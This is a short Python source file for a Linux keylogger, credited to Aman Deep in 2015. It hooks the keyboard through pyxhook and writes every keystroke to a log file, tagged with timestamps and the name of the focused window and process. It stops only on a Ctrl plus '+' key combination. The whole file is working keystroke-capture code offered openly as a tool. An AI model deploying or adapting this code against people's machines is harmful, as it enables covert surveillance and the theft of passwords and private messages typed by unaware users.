"""
Copyright (c) 2015, Aman Deep
All rights reserved.


A simple keylogger witten in python for linux platform
All keystrokes are recorded in a log file.

The program terminates when CTRL_l and the plus key(+) are pressed

"""

import pyxhook
from time import gmtime, strftime

#change this to your log file's path
log_file='file.log'

#name of the current focused window
current_window=""
#var of the open file
of=""
#debug boolean, to print in the console too
debug=False

previous_code= ""
# shutdown key
shutdown_key = 43 # ctrl_l and '+' to exit


def printOnFile(string):
	global of
	of=open(log_file,'a')
	of.write(string)
	
#for debug use
def printOnConsole(string):
	if debug:
		print string
	
#get current date time
def getDate():
	return strftime("%Y-%m-%d %H:%M:%S : ", gmtime())
    
#when a button is pressed 
def OnKeyPressConsol(event): 
	global current_window
	global previous_code
	key = ""
	if event.Ascii==0:
		key="%s" % event.Key
	else:
		key="%s" % event.Key
	if current_window==event.WindowName:
		printOnFile(" " + key)
		printOnConsole(key)
	else:
		current_window = event.WindowName
		log = "\n\n" + "-"*75 + "\n# " + getDate() + event.WindowName + " [ " + event.WindowProcName + " ]" + "\n" + "-"*75 + "\n" + key 
		printOnFile(log)
		printOnConsole(log)
	if previous_code == "Control_L" and event.Ascii == shutdown_key:   # 'Control_L'  then key to exit
		printOnFile("\nProgram close")
		of.close()
		new_hook.cancel()    	
	# set previous code
	previous_code = key

	    
#main function	  
if __name__ == '__main__':
	#instantiate HookManager class
	new_hook=pyxhook.HookManager()
	#hook the keyboard
	new_hook.HookKeyboard()
	#listen to all keystrokes
	new_hook.KeyDown=OnKeyPressConsol
	#start the session
	new_hook.start()
	
